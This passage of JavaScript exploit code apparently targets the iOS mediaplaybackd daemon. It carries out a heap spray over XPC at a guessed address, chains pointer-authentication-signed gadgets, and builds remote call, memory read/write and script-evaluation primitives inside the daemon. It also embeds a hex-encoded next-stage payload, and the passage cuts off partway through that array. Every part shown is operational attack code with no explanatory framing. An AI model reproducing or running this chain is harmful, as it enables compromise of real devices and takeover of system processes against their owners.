          thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
          n_of_current_exp_write_threads = (n_of_current_exp_write_threads + 1n) % n_of_exp_write_threads;
          if (n_of_current_exp_write_threads == 0n) {
            n_of_current_exp_write_threads = 1n;
          }
          continue;
        }
        thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
        LOG(`Likely successful EXP bypass attempt (#${exp_attempt}), checking...`);
        kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 15n, MACH_PORT_NULL);
        if (kr != MACH_SEND_TIMED_OUT) {
          LOG("[x] Error: Daemon likely crashed, retrying...");
          break;
        }
        success = true;
        break;
      }
      let alive = false;
      if (success) {
        while (true) {
          surface_address_remote = uread64(surface_address + 0x8n);
          if (surface_address_remote != 0n) {
            break;
          }
        }
        LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
        setup_nativefcall_fcall();
        {
          LOG("[i] nativefcall setup done...");
          lazy_fcall("usleep", 5n * 1000n);
          mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
          while (true) {
            let interval = Date.now();
            let test_msg = test_msg_create(connection);
            kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 1n, MACH_PORT_NULL);
            interval = Date.now() - interval;
            LOG(`msg took: ${interval} ms`);
            if (kr == MACH_SEND_TIMED_OUT) {
              if (mpd_fcall_check_for_return() == false) {
                continue;
              }
              LOG(`[i] calloc() survived !!!`);
              alive = true;
              break;
            } else {
              LOG(`[!] calloc() crashed ${kr.hex()} !!! Probably wrong malloc_zones guess address !!!`);
              services_idx = 0n;
              alive = false;
              break;
            }
          }
        }

        //mach_port_deallocate(mach_task_self(), connection["reply_port"]);
        mach_port_deallocate(mach_task_self(), connection["client_port"]);

        if (alive) {
          break;
        }
      }
    }
    if (success == false) {
      LOG("[x] Error: Reached maximum number of attempts, aborting...");
      return false;
    }
    LOG("done");
    return true;
  }
  function mpd_fcall_check_for_return() {
    let final_fcall_buf_local = surface_address + 0x400n;
    let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
    let r = uread64(mpd_fcall_retval_ptr);
    if (r != 0xcafedeadn) {
      return true;
    } else {
      return false;
    }
  }
  const MPD_FCALL_TIMED_OUT = 1n;
  const MPD_FCALL_DEFAULT_TIMEOUT = 500n;
  function mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, noreturn, do_exit = false, timeout = false) {
    let nativefcall_buf_local = surface_address + 0x100n;
    let final_fcall_buf_local = surface_address + 0x400n;
    let final_fcall_args_local = surface_address + 0x500n;
    let final_fcall_buf_remote = surface_address_remote + 0x400n;
    let final_fcall_args_remote = surface_address_remote + 0x500n;
    uwrite64(final_fcall_args_local + 0n * 0x8n, x0);
    uwrite64(final_fcall_args_local + 1n * 0x8n, x1);
    uwrite64(final_fcall_args_local + 2n * 0x8n, x2);
    uwrite64(final_fcall_args_local + 3n * 0x8n, x3);
    uwrite64(final_fcall_args_local + 4n * 0x8n, x4);
    uwrite64(final_fcall_args_local + 5n * 0x8n, x5);
    uwrite64(final_fcall_args_local + 6n * 0x8n, x6);
    uwrite64(final_fcall_args_local + 7n * 0x8n, x7);
    let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
    uwrite64(mpd_fcall_retval_ptr, 0xcafedeadn);
    nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, address, final_fcall_args_remote, true);
    uwrite64(nativefcall_buf_local, pacia(_4_fcalls + 12n * 4n, 0n));
    if (noreturn) {
      return;
    }
    let start = Date.now();
    while (uread64(mpd_fcall_retval_ptr) == 0xcafedeadn) {
      if (timeout) {
        let interval = Date.now() - start;
        if (interval > MPD_FCALL_DEFAULT_TIMEOUT) {
          return MPD_FCALL_TIMED_OUT;
        }
      }
    }
    let return_value = uread64(mpd_fcall_retval_ptr);
    return return_value;
  }
  function mpd_fcall(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false);
  }
  function mpd_fcall_noreturn(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true);
  }
  function mpd_fcall_noreturn_exit(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true, true);
  }
  function mpd_fcall_timeout(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false, false, true);
  }
  function mpd_read64(address) {
    uwrite64(surface_address + 0x2100n, 0n);
    mpd_fcall(MEMCPY, surface_address_remote + 0x2100n, address, 8n, 0n, 0n, 0n, 0n, 0n);
    return uread64(surface_address + 0x2100n);
  }
  function mpd_write64(address, value) {
    uwrite64(surface_address + 0x2100n, value);
    mpd_fcall(MEMCPY, address, surface_address_remote + 0x2100n, 8n, 0n, 0n, 0n, 0n, 0n);
  }
  function round_down_power_of_two(n) {
    if (n < 1n) {
      return 0n;
    }
    let power = 1n;
    while (power <= n) {
      power <<= 1n;
    }
    return power >> 1n;
  }
  function get_event_handler_block() {
    let event_handler_block = calloc(1n, 0x100n);
    uwrite64(event_handler_block + 8n * 1n, 0x50000000n);
    let event_handler_block_impl = xpac(func_resolve("getpid"));
    let event_handler_block_impl_addr = event_handler_block + 0x10n;
    let event_handler_block_impl_sign = pacia(event_handler_block_impl, event_handler_block_impl_addr);
    uwrite64(event_handler_block_impl_addr, event_handler_block_impl_sign);
    return event_handler_block;
  }
  function nativefcall_insert_fcall(x0_local, x0_remote, pc, args, get_return_value) {
    let target_pc = 0n;
    let load_x1x3x8_args_local = 0n;
    let load_x1x3x8_args_remote = 0n;
    if (get_return_value) {
      load_x1x3x8_args_local = x0_local + 0x40n;
      load_x1x3x8_args_remote = x0_remote + 0x40n;
      uwrite64(x0_local + 0x0n, load_x1x3x8_args_remote);
      uwrite64(x0_local + 0x8n, pacia(load_x1x3x8, 0n));
      target_pc = _CFObjectCopyProperty;
    } else {
      load_x1x3x8_args_local = x0_local;
      load_x1x3x8_args_remote = x0_remote;
      target_pc = load_x1x3x8;
    }
    uwrite64(load_x1x3x8_args_local + 0x20n, load_x1x3x8_args_remote + 0x40n);
    uwrite64(load_x1x3x8_args_local + 0x28n, args - 0x10n);
    uwrite64(load_x1x3x8_args_local + 0x30n, pacia(pc.noPAC(), 0xC2D0n));
    uwrite64(load_x1x3x8_args_local + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args_remote + 0x50n));
    return target_pc;
  }
  function setup_nativefcall(surface, x0_local, x0_remote) {
    let surface_id = IOSurfaceGetID(surface);
    let surface_address = IOSurfaceGetBaseAddress(surface);
    LOG(`surface_address: ${surface_address.hex()}`);
    LOG(`surface_id: ${surface_id.hex()}`);
    let first_fcall_args_local = x0_local + 0x100n;
    let lookup_surface_buf_local = x0_local + 0x200n;
    let lookup_surface_args_local = x0_local + 0x300n;
    let first_fcall_args_remote = x0_remote + 0x100n;
    let lookup_surface_buf_remote = x0_remote + 0x200n;
    let lookup_surface_args_remote = x0_remote + 0x300n;
    uwrite64(lookup_surface_args_local, surface_id);
    let lookup_wrapper_pc = nativefcall_insert_fcall(lookup_surface_buf_local, lookup_surface_buf_remote, func_resolve("IOSurfaceLookup").noPAC(), lookup_surface_args_remote, false);
    uwrite64(first_fcall_args_local, lookup_surface_buf_remote);
    uwrite64(first_fcall_args_local + 0x18n, pacia(lookup_wrapper_pc, 0x4EB9n));
    uwrite64(first_fcall_args_local + 0x20n, pacia(func_resolve("IOSurfaceGetBaseAddress").noPAC(), 0x76DFn));
    uwrite64(first_fcall_args_local + 0x28n, pacia(store_x0_x0, 0x1558n));
    uwrite64(first_fcall_args_local + 0x30n, pacia(self_loop, 0x4F6Bn));
    uwrite64(surface_address, pacia(self_loop, 0n));
    let first_fcall_pc = nativefcall_insert_fcall(x0_local, x0_remote, _4_fcalls, first_fcall_args_remote, false);
    uwrite64(x0_local + 0x10n, pacia(first_fcall_pc, x0_remote + 0x10n));
  }
  function setup_nativefcall_fcall() {
    let nativefcall_buf_local = surface_address + 0x100n;
    let nativefcall_args_local = surface_address + 0x200n;
    let nativefcall_fcall_buf_local = surface_address + 0x300n;
    let final_fcall_buf_local = surface_address + 0x400n;
    let final_fcall_args_local = surface_address + 0x500n;
    let nativefcall_buf_remote = surface_address_remote + 0x100n;
    let nativefcall_args_remote = surface_address_remote + 0x200n;
    let nativefcall_fcall_buf_remote = surface_address_remote + 0x300n;
    let final_fcall_buf_remote = surface_address_remote + 0x400n;
    let final_fcall_args_remote = surface_address_remote + 0x500n;
    let init_fcall = nativefcall_insert_fcall(surface_address, surface_address_remote, _4_fcalls, nativefcall_args_remote, false);
    let nativefcall_fcall_wrapper_pc = nativefcall_insert_fcall(nativefcall_buf_local, nativefcall_buf_remote, _4_fcalls, nativefcall_fcall_buf_remote, false);
    uwrite64(nativefcall_args_local, nativefcall_buf_remote);
    uwrite64(nativefcall_args_local + 0x18n, pacia(store_x0_x0 + 4n, 0x4EB9n));
    uwrite64(nativefcall_args_local + 0x20n, pacia(nativefcall_fcall_wrapper_pc, 0x76DFn));
    uwrite64(nativefcall_args_local + 0x28n, pacia(mov_x0_x22, 0x1558n));
    uwrite64(nativefcall_args_local + 0x30n, pacia(self_loop, 0x4F6Bn));
    let final_fcall_wrapper_pc = nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, func_resolve("getpid").noPAC(), final_fcall_args_remote, true);
    uwrite64(nativefcall_fcall_buf_local, final_fcall_buf_remote);
    uwrite64(nativefcall_fcall_buf_local + 0x8n, pacia(self_loop, 0n));
    uwrite64(nativefcall_fcall_buf_local + 0x10n, nativefcall_buf_remote);
    uwrite64(nativefcall_fcall_buf_local + 0x18n, pacia(add_x22_0x90, 0x4EB9n));
    uwrite64(nativefcall_fcall_buf_local + 0x20n, pacia(str_x1_x2, 0x76DFn));
    uwrite64(nativefcall_fcall_buf_local + 0x28n, pacia(final_fcall_wrapper_pc, 0x1558n));
    uwrite64(nativefcall_fcall_buf_local + 0x30n, pacia(str_x1_x2 + 4n, 0x4F6Bn));
    uwrite64(final_fcall_buf_local + 0x28n, 0xcafedeadn);
    uwrite64(nativefcall_buf_local, pacia(self_loop, 0n));
    uwrite64(surface_address, pacia(init_fcall, 0n));
    while (uread64(final_fcall_buf_local + 0x28n) == 0xcafedeadn) {
      usleep(1n);
    }
  }
  function reset_nativefcall(surface, x0_remote) {
    uwrite64(surface_address, pacia(self_loop, 0n));
  }
  const guess_address = 0x122604000n;
  let nativefcall_remote = 0n;
  const spray_sz = 1024n * 1024n * 1024n / 4n - PAGE_SIZE;
  function setup_guess_address(surface) {
    let kr = KERN_SUCCESS;
    let spray_address_ptr = new_uint64_t();
    kr = mach_vm_allocate(mach_task_self(), spray_address_ptr, spray_sz, VM_FLAGS_ANYWHERE);
    let spray_address = uread64(spray_address_ptr);
    let guess_address_local = spray_address;
    let guess_address_remote = guess_address;
    guess_address_local += 0x110n;
    guess_address_remote += 0x110n;
    let malloc_zones = func_resolve("malloc_zones");
    let nano_zone = uread64(uread64(malloc_zones));
    let nano_zone_ptr = malloc_zones + 0x8n;
    while (true) {
      if (nano_zone == uread64(nano_zone_ptr)) {
        break;
      } else {
        nano_zone_ptr += 8n;
      }
    }
    LOG(`malloc_zones: ${malloc_zones.hex()}`);
    LOG(`nano_zone_ptr: ${nano_zone_ptr.hex()}`);
    let fake_obj_0 = guess_address_local;
    let fake_obj_1 = guess_address_local + 0x100n;
    let fake_malloc_zones = guess_address_local + 0x200n;
    let fake_obj_1_remote = guess_address_remote + 0x100n;
    let fake_malloc_zones_remote = guess_address_remote + 0x200n;
    uwrite64(fake_malloc_zones, fake_malloc_zones_remote);
    uwrite64(fake_malloc_zones + 0x68n, 0x1c000n);
    uwrite64(fake_malloc_zones + 0x90n, pacia(xpac(malloc_restore_0_gadget), 0xa9d9n));
    uwrite64(fake_obj_0 + 0x00n, fake_obj_1_remote);
    uwrite64(fake_obj_0 + 0x08n, 0n);
    uwrite64(fake_obj_0 + 0x18n, 2n);
    uwrite64(fake_obj_1 + 0x00n, fake_malloc_zones_remote);
    uwrite64(fake_obj_1 + 0x08n, malloc_zones);
    uwrite64(fake_obj_1 + 0x10n, 0x8000000000000000n);
    uwrite64(fake_obj_1 + 0x18n, 1n);
    let x0_local = fake_malloc_zones;
    let x0_remote = fake_malloc_zones_remote;
    uwrite64(x0_local + 48n, pacia(malloc_restore_1_gadget, 0n));
    uwrite64(x0_local + 56n, nano_zone_ptr - 0x8n);
    uwrite64(x0_local + 32n, x0_remote + 0x100n);
    x0_local = x0_local + 0x100n;
    x0_remote = x0_remote + 0x100n;
    uwrite64(x0_local + 0x10n, pacia(malloc_restore_2_gadget, x0_remote + 0x10n));
    uwrite64(x0_local + 32n, x0_remote + 0x20n);
    x0_local = x0_local + 0x20n;
    x0_remote = x0_remote + 0x20n;
    uwrite64(x0_local + 0x10n, pacia(malloc_restore_3_gadget, x0_remote + 0x10n));
    uwrite64(x0_local + 40n, malloc_zones);
    uwrite64(x0_local + 32n, x0_remote + 0x100n);
    x0_local = x0_local + 0x100n;
    x0_remote = x0_remote + 0x100n;
    nativefcall_remote = x0_remote;
    setup_nativefcall(surface, x0_local, nativefcall_remote);
    let lowest_power_of_two_size = round_down_power_of_two(spray_sz);
    for (let i = PAGE_SIZE; i < lowest_power_of_two_size; i *= 2n) {
      kr = mach_vm_copy(mach_task_self(), spray_address, i, spray_address + i);
      assert(kr == KERN_SUCCESS);
    }
    let remaining_size = spray_sz - lowest_power_of_two_size;
    if (remaining_size != 0n) {
      let remaining_copy_block_pages = 1n;
      let remaining_copy_block_size = remaining_copy_block_pages * PAGE_SIZE;
      for (let i = 0n; i < remaining_size; i += remaining_copy_block_size) {
        let dest_copy_addr = spray_address + lowest_power_of_two_size + i;
        kr = mach_vm_copy(mach_task_self(), spray_address, remaining_copy_block_size, dest_copy_addr);
        assert(kr == KERN_SUCCESS);
      }
    }
    let memory_object_ptr = calloc(1n, 8n);
    let memory_object_size_ptr = calloc(1n, 8n);
    uwrite64(memory_object_size_ptr, spray_sz);
    kr = mach_make_memory_entry_64(mach_task_self(), memory_object_size_ptr, spray_address, MAP_MEM_VM_SHARE | VM_PROT_DEFAULT, memory_object_ptr, MACH_PORT_NULL);
    assert(kr == KERN_SUCCESS);
    let memory_object_size = uread64(memory_object_size_ptr);
    assert(memory_object_size == spray_sz);
    let memory_object = uread64(memory_object_ptr);
    free(memory_object_size_ptr);
    free(memory_object_ptr);
    mach_vm_deallocate(mach_task_self(), spray_address, spray_sz);
    return memory_object;
  }
  function spray_guess_address(spray_memory_object, surface) {
    let kr = KERN_SUCCESS;
    let spray_address_ptr = new_uint64_t();
    kr = mach_vm_map(mach_task_self(), spray_address_ptr, spray_sz, 0n, VM_FLAGS_ANYWHERE, spray_memory_object, 0n, 1n, (VM_PROT_DEFAULT << 32n) + VM_PROT_DEFAULT, VM_INHERIT_NONE);
    assert(kr == KERN_SUCCESS);
    let spray_address = uread64(spray_address_ptr);
    reset_nativefcall(surface, nativefcall_remote);
    map_iosurface(surface);
    let endpoint_name = get_cstring("com.apple.coremedia.mediaplaybackd.sandboxserver.xpc");
    let block_impl = get_event_handler_block();
    let conn = xpc_connection_create_mach_service(endpoint_name, NULL, 0n);
    xpc_connection_set_event_handler(conn, block_impl);
    xpc_connection_activate(conn);
    let receivePort_ptr = new_uint64_t();
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receivePort_ptr);
    let receivePort = uread32(receivePort_ptr);
    kr = mach_port_insert_right(mach_task_self(), receivePort, receivePort, MACH_MSG_TYPE_MAKE_SEND);
    let conn2 = xpc_connection_create_mach_service(endpoint_name, NULL, 0n);
    uwrite_bitsize(conn2 + 0x48n, receivePort, 32n);
    xpc_connection_set_event_handler(conn2, block_impl);
    xpc_connection_activate(conn2);
    let endpoint = xpc_endpoint_create(conn2);
    let msg = xpc_dictionary_create_empty();
    xpc_dictionary_set_uint64(msg, get_cstring(".Operation"), 0x2E6F7267n);
    xpc_dictionary_set_value(msg, get_cstring("MemoryOriginEndpoint"), endpoint);
    xpc_dictionary_set_uint64(msg, get_cstring("MemoryOriginServerToken"), 0x4242424243434343n);
    let ddata = dispatch_data_create(spray_address, spray_sz, 0n, block_impl);
    let data = xpc_data_create_with_dispatch_data(ddata);
    if (wc_strcmp(device_machine, wc_get_cstring("iPhone12,8")) == 0n || wc_strcmp(device_machine, wc_get_cstring("iPhone11,8")) == 0n) {
      xpc_dictionary_set_value(msg, get_cstring("spray"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray2"), data);
    } else {
      xpc_dictionary_set_value(msg, get_cstring("spray"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray2"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray3"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray4"), data);
    }
    xpc_release(data);
    LOG(`Sending message...`);
    xpc_connection_send_message_with_reply(conn, msg, NULL, block_impl);
    xpc_release(msg);
    xpc_connection_cancel(conn);
    xpc_connection_cancel(conn2);
    mach_vm_deallocate(mach_task_self(), spray_address, spray_sz);
    LOG(`guess_address: ${guess_address.hex()}`);
    return guess_address;
  }
  function mpd_malloc(sz) {
    return mpd_fcall(CALLOC, sz, 1n);
  }
  let mpd_memwrite_page_remote = 0n;
  let mpd_memwrite_page_local = 0n;
  function mpd_memwrite(remote_addr, local_addr, sz) {
    if (mpd_memwrite_page_remote == 0n) {
      mpd_memwrite_page_remote = surface_address_remote + PAGE_SIZE * 0x8n;
      mpd_memwrite_page_local = surface_address + PAGE_SIZE * 0x8n;
    }
    while (sz > 0n) {
      let tmp_sz = sz;
      if (sz > PAGE_SIZE) {
        tmp_sz = PAGE_SIZE;
      }
      memcpy(mpd_memwrite_page_local, local_addr, tmp_sz);
      mpd_fcall(MEMCPY, remote_addr, mpd_memwrite_page_remote, tmp_sz);
      sz -= tmp_sz;
      local_addr += tmp_sz;
      remote_addr += tmp_sz;
    }
  }
  function mpd_memread(local_addr, remote_addr, sz) {
    if (mpd_memwrite_page_remote == 0n) {
      mpd_memwrite_page_remote = surface_address_remote + PAGE_SIZE * 0x8n;
      mpd_memwrite_page_local = surface_address + PAGE_SIZE * 0x8n;
    }
    while (sz > 0n) {
      let tmp_sz = sz;
      if (sz > PAGE_SIZE) {
        tmp_sz = PAGE_SIZE;
      }
      mpd_fcall(MEMCPY, mpd_memwrite_page_remote, remote_addr, tmp_sz);
      memcpy(local_addr, mpd_memwrite_page_local, tmp_sz);
      sz -= tmp_sz;
      local_addr += tmp_sz;
      remote_addr += tmp_sz;
    }
  }
  function mpd_dump(addr, sz) {
    let data = calloc(1n, sz);
    mpd_memread(data, addr, sz);
    DUMP(data, sz);
  }
  function mpd_new_uint64(val) {
    let buf = mpd_malloc(0x8n);
    mpd_write64(buf, val);
    return buf;
  }
  function mpd_get_cstring(str) {
    if (typeof str === "string") {
      str = get_cstring(str);
    }
    let c_str_len = strlen(str);
    let mpd_c_str = mpd_malloc(c_str_len + 0x1n);
    mpd_memwrite(mpd_c_str, str, c_str_len);
    return mpd_c_str;
  }
  function mpd_create_cfstring(js_str) {
    return mpd_fcall(CFSTRINGCREATEWITHCSTRING, kCFAllocatorDefault, mpd_get_cstring(js_str), kCFStringEncodingUTF8);
  }
  function mpd_sel_registerName(cstr) {
    return mpd_fcall(SEL_REGISTERNAME, cstr);
  }
  function mpd_objc_getClass(class_name) {
    return mpd_fcall(OBJC_GETCLASS, class_name);
  }
  function mpd_objc_alloc_init(class_obj) {
    return mpd_fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function mpd_objc_msgSend(...args) {
    return mpd_fcall(OBJC_MSGSEND, ...args);
  }
  function mpd_objc_msgSend_nowait(...args) {
    return mpd_fcall_noreturn(OBJC_MSGSEND, ...args);
  }
  function mpd_objc_msgSend_nowait_exit(...args) {
    return mpd_fcall_noreturn_exit(OBJC_MSGSEND, ...args);
  }
  function mpd_objectForKeyedSubscript(obj, key) {
    let cfstr = mpd_create_cfstring(key);
    let selector = mpd_sel_registerName(mpd_get_cstring("objectForKeyedSubscript:"));
    return mpd_objc_msgSend(obj, selector, cfstr);
  }
  function mpd_increase_stack_limit() {
    let tls = mpd_fcall(PTHREAD_SELF);
    LOG("[MPD] tls: " + tls.hex());
    mpd_write64(tls + 0xb0n, surface_address_remote + surface_size);
    mpd_write64(tls + 0xb8n, surface_address_remote + surface_size - fcall_stack_sz);
  }
  function mpd_evaluateScript(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend(obj, selector, jscript);
  }
  function mpd_evaluateScript_nowait(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend_nowait(obj, selector, jscript);
  }
  function mpd_evaluateScript_nowait_exit(obj, jscript) {
    let selector = mpd_sel_registerName(mpd_get_cstring("evaluateScript:"));
    return mpd_objc_msgSend_nowait_exit(obj, selector, jscript);
  }
  function mpd_pacib(ptr, ctx) {
    return mpd_fcall(dyld_signPointer_gadget, ptr, 0n, 0n, ctx, 1n);
  }
  function mpd_setup_fcall_jopchain() {
    let jsvm_fcall_buff = mpd_malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    mpd_write64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    mpd_write64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    mpd_write64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    mpd_write64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    mpd_write64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    mpd_write64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    mpd_write64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    mpd_write64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return [jsvm_fcall_buff, load_x1x3x8_args + 0x30n, jsvm_fcall_args];
  }
  function spawn_pe() {
    LOG("Spawning PE....");
    let pe_stage1_js_data = 0n;
    let pe_main_js_data = 0n;
    let pe_post_js_data = 0n;
    if (integrated) {
      let pe_stage1_js_data_array = new Uint8Array([
        0x28, 0x28, 0x29, 0x20, 0x3d, 0x3e, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x61, 0x62, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x41, 0x72, 0x72, 0x61, 0x79, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x28, 0x38, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x75, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x42, 0x69, 0x67, 0x55, 0x69, 0x6e, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61, 0x62, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x75, 0x33, 0x32, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x33, 0x32, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61, 0x62, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x75, 0x38, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x55, 0x69, 0x6e, 0x74, 0x38, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61, 0x62, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x20, 0x66, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x6e, 0x65, 0x77, 0x20, 0x46, 0x6c, 0x6f, 0x61, 0x74, 0x36, 0x34, 0x41, 0x72, 0x72, 0x61, 0x79, 0x28, 0x61, 0x62, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x66, 0x72, 0x6f, 0x6d, 0x44, 0x6f, 0x75, 0x62, 0x6c, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x76, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x76, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x66, 0x72, 0x6f, 0x6d, 0x42, 0x79, 0x74, 0x65, 0x73, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x62, 0x79, 0x74, 0x65, 0x73, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x28, 0x6c, 0x65, 0x74, 0x20, 0x69, 0x20, 0x3d, 0x20, 0x30, 0x3b, 0x20, 0x69, 0x20, 0x3c, 0x20, 0x38, 0x3b, 0x20, 0x2b, 0x2b, 0x69, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x38, 0x5b, 0x69, 0x5d, 0x20, 0x3d, 0x20, 0x62, 0x79, 0x74, 0x65, 0x73, 0x5b, 0x69, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x7d, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x75, 0x36, 0x34, 0x5b, 0x30, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x68, 0x65, 0x78, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x31, 0x36, 0x2c, 0x20, 0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x20, 0x3d, 0x20, 0x30, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x73, 0x20, 0x3d, 0x20, 0x27, 0x30, 0x78, 0x27, 0x20, 0x2b, 0x20, 0x74, 0x68, 0x69, 0x73, 0x2e, 0x74, 0x6f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x28, 0x31, 0x36, 0x29, 0x2e, 0x70, 0x61, 0x64, 0x53, 0x74, 0x61, 0x72, 0x74, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x2c, 0x20, 0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x29, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x5b, 0x5d, 0x5b, 0x73, 0x5d, 0x3b, 0xa, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x73, 0x3b, 0xa, 0x20, 0x20, 0x7d, 0x3b, 0xa, 0x20, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x70, 0x72, 0x6f, 0x74, 0x6f, 0x74, 0x79, 0x70, 0x65, 0x2e, 0x68, 0x65, 0x78, 0x50, 0x6c, 0x61, 0x69, 0x6e, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x70, 0x61, 0x64, 0x4e, 0x75, 0x6d, 0x62, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x31, 0x36, 0x2c, 0x20, 0x70, 0x61, 0x64, 0x43, 0x68, 0x61, 0x72, 0x20, 0x3d, 0x20, 0x30, 0x29, 0x20, 0x7b, 0xa, 0x20, 0x20, 0x20, 